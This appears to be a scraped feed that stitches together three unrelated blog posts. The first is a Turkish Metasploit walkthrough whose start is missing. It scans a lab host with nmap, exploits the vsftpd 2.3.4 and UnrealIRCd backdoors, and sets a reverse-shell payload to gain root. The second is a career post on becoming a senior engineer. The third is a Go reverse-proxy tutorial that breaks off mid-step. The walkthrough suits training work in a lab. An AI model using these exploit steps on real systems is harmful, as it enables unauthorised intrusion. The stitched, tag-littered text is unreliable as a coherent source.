&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--0VbaYM6I--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hb8ugv4y2u21j56640a0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--0VbaYM6I--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hb8ugv4y2u21j56640a0.png" alt="Image description" width="491" height="540"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Şimdi bu IP üzerinden hedef sistemdeki portlarda çalışan servislerin versiyonları hakkında bilgi alalım.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;nmap –sV 10.0.2.4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;-sV parametresi servislerin versiyonlarını getirir.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Metasploit Nedir ? ( msfconsole )&lt;/strong&gt; &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Metasploit Framework, hem ofansif hem de defansif güvenlikte kullanılan açık kaynaklı ve Ruby dili ile yazılmış bir  platformdur. Metasploit Framework, sistemlerde bulunan açıkların tespit edilmesi, sömürülmesi ve sistemlere sızılması için gerekli araçları içinde barındıran bir yapıdır. &lt;/p&gt;

&lt;p&gt;Metasploit Framework’ü Kali Linux içerisinde hazır olarak gelmektedir.Çalıştırmak için ise &lt;code&gt;msfconsole&lt;/code&gt; Komutu kullanılmalıdır.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qzQIiNvh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/411gegohgs8z4phlr8al.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qzQIiNvh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/411gegohgs8z4phlr8al.png" alt="Image description" width="722" height="324"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Metasploit üzerinde bir servisin exploitin bulunup bulunmadığını anlamak için &lt;code&gt;search&lt;/code&gt; komutunu kullanırız.  &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--lmHE5iOA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ck9350ytcwkxsd1a5zgi.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--lmHE5iOA--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ck9350ytcwkxsd1a5zgi.png" alt="Image description" width="880" height="232"&gt;&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;search vsftpd
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Komutunu kullanarak vsftpd servisinde bir exploitin bulunup bulunmadığını aradık ver karşımıza bir adet exploit çıktı.Bu exploiti kullanmak için bulduğumuz exploitin Name kısmını kullanarak exploiti seçiyoruz.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;use exploit/unix/ftp/vsftpd_234_backdoor
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Y5qocDE0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z0cljbyxknrbi2s6vk2h.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Y5qocDE0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z0cljbyxknrbi2s6vk2h.png" alt="Image description" width="880" height="124"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploitimizi seçtik,şimdi de bu exploite uygun payloadları listelememiz gerekiyor bunun için şu komutu kullanıyoruz.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;show payloads
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--90pAUsM6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k8b552jukvfpr0zx3cx1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--90pAUsM6--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/k8b552jukvfpr0zx3cx1.png" alt="Image description" width="880" height="163"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Payloadlar listelendi.Aralarından birini seçmek için ise;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;set payload payload/cmd/unix/interact 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ufn3aFrF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ze0hbrxf84nocg13778y.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ufn3aFrF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ze0hbrxf84nocg13778y.png" alt="Image description" width="880" height="196"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploitimizi de payloadımızı da seçtik. Şimdi bu exploitin hangi sisteme IP'ye sızacağını belirtmemiz gerek. Aksi takdirde exploit hangi sisteme sızma işlemi yapacağını normal olarak bilemeyecektir. Ayarları göstermek için ise;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;show options 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;komutunu kullanırız.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--6xV_qvBc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fh45ccmijhbxvuuigis1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--6xV_qvBc--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fh45ccmijhbxvuuigis1.png" alt="Image description" width="859" height="331"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Buradaki ayarların ne olduğunu açıklayacak olursak,&lt;br&gt;
RHOST Hedef cihazın IP’si olmalı,&lt;br&gt;
RPORT ise hedef cihazda hangi porttan sızma işlemi yapacaksak o portun numarası olmalı.&lt;br&gt;
Bu ayarları değiştirmek için;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;set RHOST 10.0.2.4
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;set RPORT 21
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7AxmEmJi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e27r454b7i3xj0vtdi4t.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7AxmEmJi--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/e27r454b7i3xj0vtdi4t.png" alt="Image description" width="846" height="190"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Sızma işlemini başlatmak için ise&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;run 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;ya da&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;exploit
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Komutlarını kullanırız.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--P0S78ODJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ikkn1mjx42jek4wxgb4o.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--P0S78ODJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ikkn1mjx42jek4wxgb4o.png" alt="Image description" width="868" height="197"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Görüldüğü gibi bir shell bağlantısının açıldığı yazıyor ekranda. Şuan karşı sisteme başarılı bir şekilde sızdığımızı söyleyebilirim. Şuan karşı sistemde bazı komutları kullanmayı deneyebilirsiniz. Örnek olarak &lt;code&gt;ls&lt;/code&gt; , &lt;code&gt;whoami&lt;/code&gt; vb.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Cg18CUlH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5dqxmz2rc0sj5sxvqfnu.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Cg18CUlH--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5dqxmz2rc0sj5sxvqfnu.png" alt="Image description" width="794" height="540"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Hedef sistemde hangi kullanıcı ile giriş yaptığımızı görmek için &lt;br&gt;
&lt;code&gt;whoami&lt;/code&gt; kullanalım.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_mG_KdM3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/htwbn000clu3w9h5wzvs.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_mG_KdM3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/htwbn000clu3w9h5wzvs.png" alt="Image description" width="880" height="103"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Gördüğünüz gibi root kullanıcıyız.Ancak her zaman bu kadar şanslı olamayabiliriz. Yetkisi düşük bir kullanıcı ile giriş yapmış olabilirdir.O zaman da yetkimizi yükseltmek için farklı yöntemlere başvuracaktık.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Şimdi ise başka bir sızma testini reverse payload ile yapalım.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Bu sefer 6667. portta çalışan servisten sisteme sızacağız.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HfuanlXp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kllt4tv6624dw2butjew.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HfuanlXp--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kllt4tv6624dw2butjew.png" alt="Image description" width="880" height="222"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Msfconsole üzerinden bu servisi aratalım.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;Search UnrealIRCd
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MlU6g142--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/m1tbpq0y1037but474la.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MlU6g142--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/m1tbpq0y1037but474la.png" alt="Image description" width="880" height="189"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Gördüğünüz gibi yine bu servis ile ilgili bir exploit bulundu. Hemen kullanımına geçelim.&lt;/p&gt;

&lt;p&gt;Bulduğumuz exploiti seçelim.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;use exploit/unix/irc/unreal_ircd_3281_backdoor
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YXe8TQ7l--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mfsdeokdl9pbvznys947.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YXe8TQ7l--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mfsdeokdl9pbvznys947.png" alt="Image description" width="880" height="57"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Exploiti use komutu ile seçtikten sonra payloadlara göz atalım.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;show payloads
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--PjUgxUPY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a0mxw9pj3m422otszpas.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--PjUgxUPY--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a0mxw9pj3m422otszpas.png" alt="Image description" width="880" height="275"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Payladımızı set komutu ile seçelim&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;set payload payload/cmd/unix/reverse
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Her payload çalışmayabilir,çalışmayan payload olursa başka bir payload denemeliyiz.Eğer sisteme sızamazsak bu exploit çalışmadığı anlamına gelmez.Payload'ımızda sorun olabilir,farklı payloadlar denersek sorunu çözebiliriz.&lt;/p&gt;

&lt;p&gt;Gerekli ayarlamaları yapalım.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;show options
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--EwDEjYt5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/01ilb23cg35ar89slz0t.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--EwDEjYt5--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/01ilb23cg35ar89slz0t.png" alt="Image description" width="880" height="358"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Bu sefer RHOST ve RPORT dışında da farklı ayarlar gördük. Bunlar &lt;strong&gt;LHOST&lt;/strong&gt; ve &lt;strong&gt;LPORT&lt;/strong&gt; .Peki bu LHOST ve LPORT nedir. Başta anlattığımız reverse payload'ın ayarlarıdır. Reverse payloadın çalışma mantığı sızacağımız sistem bize bağlanıyordu. Bu yüzden &lt;/p&gt;

&lt;p&gt;LHOST bizim IP adresimiz&lt;br&gt;
LPORT karşı bağlantının bizimle iletişime geçecek olan port numarası.&lt;/p&gt;

&lt;p&gt;Ayarları yaptıktan sonra exploiti çalıştırabiliriz.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--WOHClr0o--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/63izb3cpcjb1z9r5hke9.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--WOHClr0o--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/63izb3cpcjb1z9r5hke9.png" alt="Image description" width="880" height="360"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Ve gördüğünüz gibi tekrardan karşı sisteme sızmış bulunmaktayız...&lt;/p&gt;

      <title>What it takes to be a Senior Engineer</title>
      <author>Daniel Kassen</author>
      <pubDate>Tue, 07 Dec 2021 20:45:05 +0000</pubDate>
      <link>https://dev.to/dkassen/what-it-takes-to-be-a-senior-engineer-51fp</link>
      <guid>https://dev.to/dkassen/what-it-takes-to-be-a-senior-engineer-51fp</guid>
      <description>&lt;p&gt;Hello Friends.&lt;/p&gt;

&lt;p&gt;I finally did it. Happened about a month and a half ago. I was ✨ promoted ✨ to a senior level engineering position. Want to know the most frustrating part about it? It didn't feel like I deserved it. Yes, imposter syndrome sticks with you.&lt;/p&gt;

&lt;p&gt;I started my career as a software engineer five years ago after working a job as a developer at a small startup that just needed hands and thoughts which I kinda see as my boot camp experience.&lt;/p&gt;

&lt;p&gt;I started my "engineering" career at a larger, yet still small startup in San Francisco, where I learned a lot, but not enough to become a senior there. I did primarily backend work with a spattering of frontend excursions. I got close to senior at that company. So close that my manager wasn't able to pinpoint anything specific to work on.&lt;/p&gt;

&lt;p&gt;I was good enough though to land a job at a larger, public company where I was given a position that was once called senior (but was actually software engineer III). The job didn't feel senior and I didn't feel senior. I've stayed at this company for over two years, learned how things work, started working in the frontend, started planning projects, started running certain meetings, and it finally happened. I got promoted. That's the basic history. Five years. Expect that long.&lt;/p&gt;

&lt;p&gt;Now for what &lt;em&gt;actually&lt;/em&gt; got me to where I am.&lt;/p&gt;

&lt;p&gt;You need expertise in the technology. I have four years of experience as a backend engineer and one as a fullstack engineer. I know databases, APIs, graphQL, react and redux, bash, vim, how to use my IDE effectively, how to test things properly, a bit about AWS, networking, algorithms and data structures, design patterns, architecture best practices.. the list goes on. There's a lot you need to know -- some you'll encounter in your day-to-day, some you need to seek out. I read a lot of books. Things will start to meld together and your thoughts and ideas will become more complex without you even noticing.&lt;/p&gt;

&lt;p&gt;You need expertise in yourself. My work ethic has fluctuated over the years, but like the Dow Jones, it inches up ever so slightly over time. You need to learn how to use your time effectively. You need to know your limits, set boundaries, and keep focused on one thing at a time, as much as possible. Time management is a skill you build up over time (is that a pun? not a good one, if so) and I -still- suck at it, but I'm  getting better as more responsibility is piled on to my plate.&lt;/p&gt;

&lt;p&gt;You need expertise in interpersonal communication. If you've read the 7 habits of highly effective people (if you haven't do it, and read it slowly, and absorb what he is saying), you might recognize that the first two paragraphs of what you need are all about becoming independent. Independent is good, but the real magic comes from interdependence -- working with a team of independent people who leverage each other's strengths to create something much bigger and stronger than they are alone. You need to learn how to communicate your problems, what you know, how you can help, what you need help with. Communication is something I can't effectively teach, it's just something that comes with time and experience. One thing I can advise is this -- listen twice as much as you speak. Not just at your job, but in every aspect of your life. Listen to understand, not to respond.&lt;/p&gt;

&lt;p&gt;I probably didn't hit on every detail precisely, because your journey will differ from mine. Like I said, this kind of came together over the course of 5 years, plus the boot camp time. Invest in yourself. Learn as much as you can. Bring value to your team, your customers, and yourself. You can do it, so stick to it.&lt;/p&gt;

&lt;p&gt;Thanks for reading.&lt;/p&gt;

      <title>Build reverse proxy server in Go</title>
      <author>b0r</author>
      <pubDate>Tue, 07 Dec 2021 20:44:28 +0000</pubDate>
      <link>https://dev.to/b0r/implement-reverse-proxy-in-gogolang-2cp4</link>

  What is a Proxy Server &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;p&gt;Proxy server is a server that provides a gateway between the client (Alice) and the origin server (Bob). Instead of connecting directly to the origin server (to fulfill a resource request), client directs the request to the proxy server, which evaluates the request and performs the required action a origin server on the client behalf (e.g. get current time). [1]&lt;/p&gt;

  &lt;/a&gt;
  Proxy Server types &lt;a&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#forward-proxy"&gt;
  &lt;/a&gt;
  Forward Proxy &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;An ordinary forward proxy is an intermediate server that sits between the client and the origin server. In order to get content from the origin server, the client sends a request to the proxy naming the origin server as the target and the proxy then requests the content from the origin server and returns it to the client. The origin server is only aware of the proxy server and not the client (optional).&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#use-cases"&gt;
  &lt;/a&gt;
  Use cases
&lt;/h4&gt;

&lt;p&gt;A typical usage of a forward proxy is to provide Internet access to internal clients that are otherwise restricted by a firewall.&lt;br&gt;
The forward proxy can also use caching to reduce network usage. &lt;br&gt;
In addition, forward proxy can also be used to hide clients IP address. [2]&lt;/p&gt;
&lt;h3&gt;
  &lt;a href="#reverse-proxy"&gt;
  &lt;/a&gt;
  Reverse Proxy &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;A reverse proxy, by contrast, appears to the client just like an ordinary web server. No special configuration on the client is necessary. The client makes ordinary requests for content in the name-space of the reverse proxy. The reverse proxy then decides where to send those requests, and returns the content as if it was itself the origin.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#use-cases"&gt;
  &lt;/a&gt;
  Use cases
&lt;/h4&gt;

&lt;p&gt;A typical usage of a reverse proxy is to provide Internet users access to a server that is behind a firewall (opposite of Forward Proxy).&lt;/p&gt;

&lt;p&gt;Reverse proxies can also be used to balance load among several back-end servers, or to filter, rate limit or log incoming request, or to provide caching for a slower back-end server.&lt;/p&gt;

&lt;p&gt;In addition, reverse proxies can be used simply to bring several servers into the same URL space. [2]&lt;/p&gt;

&lt;/h3&gt;
&lt;h4&gt;
  &lt;a href="#step-1-create-origin-server"&gt;
  &lt;/a&gt;
  Step 1: Create origin server &lt;a&gt;&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;In order to test our reverse proxy, we first need to create and start a simple origin server. &lt;br&gt;
Origin server will be started at port &lt;code&gt;8081&lt;/code&gt; and it will return a string containing the value "origin server response".&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight go"&gt;&lt;code&gt;  &lt;span class="k"&gt;package&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;

  &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="s"&gt;"fmt"&lt;/span&gt;
    &lt;span class="s"&gt;"log"&lt;/span&gt;
    &lt;span class="s"&gt;"net/http"&lt;/span&gt;
    &lt;span class="s"&gt;"time"&lt;/span&gt;
  &lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;func&lt;/span&gt; &lt;span class="n"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;originServerHandler&lt;/span&gt; &lt;span class="o"&gt;:=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HandlerFunc&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ResponseWriter&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;req&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;"[origin server] received request at: %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Now&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt;
        &lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;_&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fmt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fprint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;"origin server response"&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="p"&gt;})&lt;/span&gt;

      &lt;span class="n"&gt;log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Fatal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ListenAndServe&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;":8081"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;originServerHandler&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h5&gt;
  &lt;a href="#step-1-test"&gt;
  &lt;/a&gt;
  Step 1 Test
&lt;/h5&gt;

&lt;p&gt;Start the server:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;go run main
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Use &lt;code&gt;curl&lt;/code&gt; command to validate origin server works as expected:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;% curl &lt;span class="nt"&gt;-i&lt;/span&gt; localhost:8081
HTTP/1.1 200 OK
Date: Tue, 07 Dec 2021 19:32:00 GMT
Content-Length: 22
Content-Type: text/plain&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;charset&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;utf-8

origin server response%
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the terminal of the origin server you should see:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
